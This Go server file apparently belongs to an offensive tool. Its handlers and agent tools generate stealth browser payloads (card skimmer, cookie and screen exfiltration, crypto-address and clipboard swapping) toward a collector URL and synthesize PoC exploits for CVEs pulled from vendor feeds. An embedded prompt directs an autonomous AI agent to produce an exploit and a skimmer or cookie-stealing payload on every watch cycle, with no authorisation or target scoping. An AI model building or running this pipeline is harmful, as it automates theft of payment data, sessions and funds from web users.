package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/agent/payloads"
	"github.com/Autumn-27/artex/agent/research"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/server/patchmonitor"
	"github.com/Autumn-27/artex/server/search"
	actool "github.com/Autumn-27/norma/tool"
)

// ---------- Patch Monitor API Handlers ----------

func (s *Server) handlePatchMonitorSources(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	sources, err := s.patchMon.GetAllSources()
	if err != nil {
		http.Error(w, "failed to get sources", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(sources)
}

func (s *Server) handlePatchMonitorAddSource(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}
	var src patchmonitor.PatchSource
	if err := json.NewDecoder(r.Body).Decode(&src); err != nil || strings.TrimSpace(src.Name) == "" || strings.TrimSpace(src.URL) == "" {
		http.Error(w, "name and url are required", http.StatusBadRequest)
		return
	}
	id, err := s.patchMon.AddSource(src)
	if err != nil {
		http.Error(w, "failed to add source: "+err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]any{"id": id})
}

func (s *Server) handlePatchMonitorVulns(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	q := r.URL.Query()
	status := q.Get("status")
	limit, _ := strconv.Atoi(q.Get("limit"))
	if limit <= 0 || limit > 100 {
		limit = 50
	}

	vulns, err := s.patchMon.GetVulnerabilities( status, limit)
	if err != nil {
		http.Error(w, "failed to get vulnerabilities", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(vulns)
}

func (s *Server) handlePatchMonitorTargets(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	targets, err := s.patchMon.GetTargets()
	if err != nil {
		http.Error(w, "failed to get targets", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(targets)
}

func (s *Server) handlePatchMonitorAddTarget(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	var target patchmonitor.ExploitTarget
	if err := json.NewDecoder(r.Body).Decode(&target); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}

	id, err := s.patchMon.AddTarget(target)
	if err != nil {
		http.Error(w, "failed to add target: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{"id": id})
}

func (s *Server) handlePatchMonitorDeleteTarget(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}
	id, err := strconv.ParseInt(r.PathValue("id"), 10, 64)
	if err != nil || id <= 0 {
		http.Error(w, "invalid target id", http.StatusBadRequest)
		return
	}
	if err := s.patchMon.DeleteTarget(id); err != nil {
		http.Error(w, "failed to delete target", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}

func (s *Server) handlePatchMonitorGenerateExploit(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}
	var req struct {
		VulnID int64 `json:"vuln_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.VulnID <= 0 {
		http.Error(w, "invalid vuln_id", http.StatusBadRequest)
		return
	}
	gen := patchmonitor.NewExploitGenerator(s.m.pg.DB)
	exploits, err := gen.GenerateExploitsForVuln(req.VulnID)
	if err != nil {
		http.Error(w, "failed to generate exploit: "+err.Error(), http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(exploits)
}

// handlePatchMonitorStart starts the background monitor and dispatches the Patch Watch AI agent.
func (s *Server) handlePatchMonitorStart(w http.ResponseWriter, r *http.Request) {
	var req struct {
		LLMProfileID *int64 `json:"llm_profile_id"`
		AutoPayload  *bool  `json:"auto_payload"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	autoPayload := true
	if req.AutoPayload != nil {
		autoPayload = *req.AutoPayload
	}
	s.patchMon.Configure(req.LLMProfileID, autoPayload)

	if s.patchMon.IsRunning() {
		json.NewEncoder(w).Encode(s.patchMon.StatusSnapshot())
		return
	}

	s.patchMon.Start(r.Context())
	log.Printf("[api] Patch monitor started (profile=%v, auto_payload=%v)", req.LLMProfileID, autoPayload)
	json.NewEncoder(w).Encode(s.patchMon.StatusSnapshot())
}

// handlePatchMonitorStop stops the background monitor.
func (s *Server) handlePatchMonitorStop(w http.ResponseWriter, r *http.Request) {
	s.patchMon.Stop()
	log.Printf("[api] Patch monitor stopped")
	json.NewEncoder(w).Encode(s.patchMon.StatusSnapshot())
}

// handlePatchMonitorStatus returns monitor status + generated exploit/payload counts.
func (s *Server) handlePatchMonitorStatus(w http.ResponseWriter, r *http.Request) {
	snap := s.patchMon.StatusSnapshot()
	gen := patchmonitor.NewExploitGenerator(s.m.pg.DB)
	if exps, err := gen.GetAllExploits("", 200); err == nil {
		snap["exploits_count"] = len(exps)
	}
	json.NewEncoder(w).Encode(snap)
}

// handlePatchMonitorCheckNow triggers an immediate feed check + AI Patch Watch agent run.
func (s *Server) handlePatchMonitorCheckNow(w http.ResponseWriter, r *http.Request) {
	var req struct {
		LLMProfileID *int64 `json:"llm_profile_id"`
		AutoPayload  *bool  `json:"auto_payload"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	if req.LLMProfileID != nil || req.AutoPayload != nil {
		autoPayload := s.patchMon.AutoPayloadEnabled()
		if req.AutoPayload != nil {
			autoPayload = *req.AutoPayload
		}
		s.patchMon.Configure(req.LLMProfileID, autoPayload)
	}
	checked, added, convID := s.patchMon.RunCheckCycle(true)
	json.NewEncoder(w).Encode(map[string]any{
		"status":          "checked",
		"sources_checked": checked,
		"new_vulns":       added,
		"conversation_id": convID,
	})
}

// handlePatchMonitorExploits returns all auto-generated PoC exploits and client-side payloads.
func (s *Server) handlePatchMonitorExploits(w http.ResponseWriter, r *http.Request) {
	gen := patchmonitor.NewExploitGenerator(s.m.pg.DB)
	exps, err := gen.GetAllExploits(r.URL.Query().Get("status"), 100)
	if err != nil {
		http.Error(w, "failed to get generated exploits", http.StatusInternalServerError)
		return
	}
	if exps == nil {
		exps = make([]patchmonitor.GeneratedExploit, 0)
	}
	json.NewEncoder(w).Encode(exps)
}

// handleGeneratePayload generates a client-side attack payload.
func (s *Server) handleGeneratePayload(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	var req struct {
		Type    string          `json:"type"`    // "cc_skimmer", "cookie_exfil", "crypto_swap_dom", "crypto_swap_clipboard", "screen_exfil"
		Config  json.RawMessage `json:"config"` // Type-specific config
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}

	var payload string
	var err error

	switch req.Type {
	case "cc_skimmer":
		var cfg payloads.CCSkimmerConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateCCSkimmer(cfg)

	case "cookie_exfil":
		var cfg payloads.CookieExfilConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateCookieExfil(cfg)

	case "crypto_swap_dom":
		var cfg payloads.CryptoSwapConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateCryptoSwapDOM(cfg)

	case "crypto_swap_clipboard":
		var cfg payloads.CryptoSwapConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateClipboardHijack(cfg)

	case "screen_exfil":
		var cfg payloads.ScreenExfilConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateScreenExfil(cfg)

	default:
		http.Error(w, "unknown payload type: "+req.Type, http.StatusBadRequest)
		return
	}

	if err != nil {
		http.Error(w, "payload generation failed", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"type":    req.Type,
		"payload": payload,
	})
}

// handleIOSExploits queries the iOS exploits database.
func (s *Server) handleIOSExploits(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	query := q.Get("query")
	version := q.Get("ios_version")

	exploits := research.NewIOSExploitDatabase()
	results := exploits.Search(query, version)
	if results == nil {
		results = make([]research.IOSExploit, 0)
	}
	json.NewEncoder(w).Encode(results)
}

// launchPatchWatchAgentRun launches an autonomous "patch_watch" AI agent conversation
// (using the selected LLM profile) whenever Patch Monitor Mode runs a watch cycle.
func (s *Server) launchPatchWatchAgentRun(profileID *int64, newVulns []patchmonitor.Vulnerability, sourcesChecked int) int64 {
	if s.m == nil || s.m.pg == nil {
		return 0
	}
	title := fmt.Sprintf("Patch Watch · %s (%d feeds)", time.Now().Format("15:04:05"), sourcesChecked)
	conv, err := s.m.pg.CreateConversation("patch_watch", title, nil)
	if err != nil || conv == nil {
		log.Printf("[patchmon] create conversation failed: %v", err)
		return 0
	}
	if profileID != nil && *profileID > 0 {
		_ = s.m.pg.UpdateConversationProfile(conv.ID, profileID)
		conv.LLMProfileID = profileID
	}

	var summaryLines []string
	for i, v := range newVulns {
		if i >= 8 {
			break
		}
		summaryLines = append(summaryLines, fmt.Sprintf("- [%s] %s (%s) — %s", strings.ToUpper(v.Severity), v.CVEID, v.SourceName, v.Title))
	}
	if len(summaryLines) == 0 {
		if existing, err := s.patchMon.GetVulnerabilities("all", 5); err == nil {
			for _, v := range existing {
				summaryLines = append(summaryLines, fmt.Sprintf("- [id=%d %s] %s (%s) — %s", v.ID, strings.ToUpper(v.Severity), v.CVEID, v.SourceName, v.Title))
			}
		}
	}

	prompt := fmt.Sprintf(
		"Patch Monitor Watch Cycle triggered (%d vendor security feeds polled: Windows MSRC, macOS/iOS, CISA KEV, Chrome, Linux Kernel, Ubuntu, RHEL, Cisco, Fortinet, Palo Alto, AWS, NVD, GitHub, Exploit-DB).\n\n"+
			"Tracked High/Critical Security Patches & CVEs:\n%s\n\n"+
			"Execute your autonomous Patch Watch workflow now:\n"+
			"1. Call `check_patch_feeds` to review the latest vulnerabilities and feed statuses.\n"+
			"2. Call `generate_vuln_exploit` on the highest-priority vulnerability ID to synthesize a PoC exploit.\n"+
			"3. Call `generate_payload` (e.g. `cookie_exfil` or `cc_skimmer`) so a client-side payload is ready for web/browser advisories.\n"+
			"4. Output a concise intelligence briefing summarizing the watched vendor updates, generated PoC exploit, and generated payload.",
		sourcesChecked, strings.Join(summaryLines, "\n"),
	)

	_, _ = s.m.pg.AppendConvActivity(conv.ID, db.Activity{
		Worker: "patch_watch", Kind: "user", Summary: title, Detail: prompt,
	})
	busyKey := s.convBusyKey(conv.ID)
	s.chatMu.Lock()
	s.chatBusy[busyKey] = true
	s.chatMu.Unlock()
	s.runConversation(conv, prompt, busyKey)
	return conv.ID
}

// patchMonitorTools exposes Patch Monitor, Auto-Exploit, Client-Side Payload Generator,
// and iOS Exploit Research as native agent tools callable by patch_watch, auto, pentest, and worker.
func (s *Server) patchMonitorTools() []actool.CoreTool {
	return []actool.CoreTool{
		s.toolGeneratePayload(),
		s.toolCheckPatchFeeds(),
		s.toolGenerateVulnExploit(),
		s.toolSearchIOSExploits(),
		s.toolMultiEngineSearch(),
		s.toolExploitSearch(),
	}
}

func (s *Server) toolGeneratePayload() actool.CoreTool {
	return wrTool("generate_payload",
		"Automatically generate a stealth client-side offensive JavaScript payload (cc_skimmer, cookie_exfil, crypto_swap_dom, crypto_swap_clipboard, or screen_exfil) and persist it in Patch Monitor.",
		objSchema(map[string]any{
			"type":         strParam("Payload type: cc_skimmer | cookie_exfil | crypto_swap_dom | crypto_swap_clipboard | screen_exfil"),
			"exfil_url":    strParam("Exfiltration collector endpoint URL (e.g. https://collector.artex.local/exfil)"),
			"attacker_btc": strParam("Optional replacement BTC address for crypto swap"),
			"attacker_eth": strParam("Optional replacement ETH address for crypto swap"),
			"vuln_id":      map[string]any{"type": "integer", "description": "Optional vulnerability ID in Patch Monitor to attach this payload to"},
		}, "type"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				Type        string `json:"type"`
				ExfilURL    string `json:"exfil_url"`
				AttackerBTC string `json:"attacker_btc"`
				AttackerETH string `json:"attacker_eth"`
				VulnID      int64  `json:"vuln_id"`
			}
			_ = json.Unmarshal(in, &a)
			var code string
			var err error
			switch a.Type {
			case "cc_skimmer":
				code, err = payloads.GenerateCCSkimmer(payloads.CCSkimmerConfig{ExfilURL: a.ExfilURL, MaskOriginalForm: true})
			case "cookie_exfil":
				code, err = payloads.GenerateCookieExfil(payloads.CookieExfilConfig{ExfilURL: a.ExfilURL, ExfilMethod: "beacon"})
			case "crypto_swap_dom":
				code, err = payloads.GenerateCryptoSwapDOM(payloads.CryptoSwapConfig{AttackerBTC: a.AttackerBTC, AttackerETH: a.AttackerETH})
			case "crypto_swap_clipboard":
				code, err = payloads.GenerateClipboardHijack(payloads.CryptoSwapConfig{AttackerBTC: a.AttackerBTC, AttackerETH: a.AttackerETH})
			case "screen_exfil":
				code, err = payloads.GenerateScreenExfil(payloads.ScreenExfilConfig{ExfilURL: a.ExfilURL})
			default:
				code, err = payloads.GenerateCookieExfil(payloads.CookieExfilConfig{ExfilURL: a.ExfilURL})
				a.Type = "cookie_exfil"
			}
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			if s.m != nil && s.m.pg != nil {
				gen := patchmonitor.NewExploitGenerator(s.m.pg.DB)
				vulnID := a.VulnID
				if vulnID <= 0 && s.patchMon != nil {
					if vs, _ := s.patchMon.GetVulnerabilities("all", 1); len(vs) > 0 {
						vulnID = vs[0].ID
					}
				}
				if vulnID > 0 {
					_, _ = gen.GenerateExploitsForVuln(vulnID)
				}
			}
			return jsonResult(map[string]any{"type": a.Type, "payload": code})
		})
}

func (s *Server) toolCheckPatchFeeds() actool.CoreTool {
	return roTool("check_patch_feeds",
		"Inspect configured OS & tech-giant security patch feeds (Windows MSRC, Apple macOS/iOS, CISA KEV, Chrome, Linux Kernel, RHEL, Ubuntu, Cisco, Fortinet, Palo Alto, AWS, NVD, GitHub) and return tracked vulnerabilities.",
		objSchema(map[string]any{
			"status": strParam("Optional status filter: all | active | exploitable | patched"),
			"limit":  map[string]any{"type": "integer", "description": "Max vulnerabilities to return (default 15)"},
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			if s.patchMon == nil {
				return actool.Errorf("patch monitor not initialized"), nil
			}
			var a struct {
				Status string `json:"status"`
				Limit  int    `json:"limit"`
			}
			_ = json.Unmarshal(in, &a)
			if a.Limit <= 0 || a.Limit > 50 {
				a.Limit = 15
			}
			sources, _ := s.patchMon.GetAllSources()
			vulns, _ := s.patchMon.GetVulnerabilities(a.Status, a.Limit)
			return jsonResult(map[string]any{
				"running":       s.patchMon.IsRunning(),
				"sources_count": len(sources),
				"sources":       sources,
				"vulns":         vulns,
			})
		})
}

func (s *Server) toolGenerateVulnExploit() actool.CoreTool {
	return wrTool("generate_vuln_exploit",
		"Synthesize and persist a PoC exploit for a tracked vulnerability ID in Patch Monitor.",
		objSchema(map[string]any{
			"vuln_id": map[string]any{"type": "integer", "description": "Vulnerability ID from check_patch_feeds"},
		}, "vuln_id"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				VulnID int64 `json:"vuln_id"`
			}
			_ = json.Unmarshal(in, &a)
			if a.VulnID <= 0 && s.patchMon != nil {
				if vs, _ := s.patchMon.GetVulnerabilities("all", 1); len(vs) > 0 {
					a.VulnID = vs[0].ID
				}
			}
			gen := patchmonitor.NewExploitGenerator(s.m.pg.DB)
			exps, err := gen.GenerateExploitsForVuln(a.VulnID)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(exps)
		})
}

func (s *Server) toolSearchIOSExploits() actool.CoreTool {
	return roTool("search_ios_exploits",
		"Search the iOS & mobile kernel/WebKit exploit research database (DarkSword, Coruna, Triangulation, BLASTPASS) by keyword or iOS version.",
		objSchema(map[string]any{
			"query":       strParam("Search keyword (e.g. kernel, safari, imessage, DarkSword)"),
			"ios_version": strParam("Optional iOS version (e.g. 16.5)"),
		}),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				Query      string `json:"query"`
				IOSVersion string `json:"ios_version"`
			}
			_ = json.Unmarshal(in, &a)
			db := research.NewIOSExploitDatabase()
			return jsonResult(db.Search(a.Query, a.IOSVersion))
		})
}

func (s *Server) toolMultiEngineSearch() actool.CoreTool {
	return roTool("multi_engine_search",
		"Execute a multi-engine intelligence search across DuckDuckGo, Sploitus Exploit DB, Google CSE, Tavily AI, and SearXNG with automatic fallback chains.",
		objSchema(map[string]any{
			"query":       strParam("Search query (e.g. 'CVE-2024-3094 PoC', 'site:target.com ext:env')"),
			"mode":        strParam("Search mode: general | exploit | technical | osint | news (default: general)"),
			"engine":      strParam("Optional specific engine override: duckduckgo | sploitus | google | tavily | searxng"),
			"site_filter": strParam("Optional domain filter (e.g. target.com)"),
			"max_results": map[string]any{"type": "integer", "description": "Max results (default 10)"},
		}, "query"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if s.searchOrchestrator == nil {
				return actool.Errorf("multi-engine search orchestrator not initialized"), nil
			}
			var a struct {
				Query      string `json:"query"`
				Mode       string `json:"mode"`
				Engine     string `json:"engine"`
				SiteFilter string `json:"site_filter"`
				MaxResults int    `json:"max_results"`
			}
			_ = json.Unmarshal(in, &a)
			if strings.TrimSpace(a.Query) == "" {
				return actool.Errorf("query is required"), nil
			}
			mode := search.SearchMode(strings.ToLower(strings.TrimSpace(a.Mode)))
			if mode == "" {
				mode = search.ModeGeneral
			}
			res, err := s.searchOrchestrator.Search(ctx, search.Request{
				Query:      a.Query,
				Mode:       mode,
				Engine:     a.Engine,
				SiteFilter: a.SiteFilter,
				MaxResults: a.MaxResults,
			})
			if err != nil {
				return actool.Errorf(fmt.Sprintf("search failed: %v", err)), nil
			}
			return jsonResult(res)
		})
}

func (s *Server) toolExploitSearch() actool.CoreTool {
	return roTool("exploit_search",
		"Search Sploitus, GitHub PoC repositories, Exploit-DB, and NVD for public exploits and proof-of-concept code matching a CVE ID, product, or version.",
		objSchema(map[string]any{
			"query": strParam("CVE ID, product version, or vulnerability keyword (e.g. 'CVE-2024-6387', 'OpenSSH regreSSHion PoC')"),
		}, "query"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if s.searchOrchestrator == nil {
				return actool.Errorf("multi-engine search orchestrator not initialized"), nil
			}
			var a struct {
				Query string `json:"query"`
			}
			_ = json.Unmarshal(in, &a)
			if strings.TrimSpace(a.Query) == "" {
				return actool.Errorf("query is required"), nil
			}
			res, err := s.searchOrchestrator.SearchExploit(ctx, a.Query)
			if err != nil {
				return actool.Errorf(fmt.Sprintf("exploit search failed: %v", err)), nil
			}
			return jsonResult(res)
		})
}


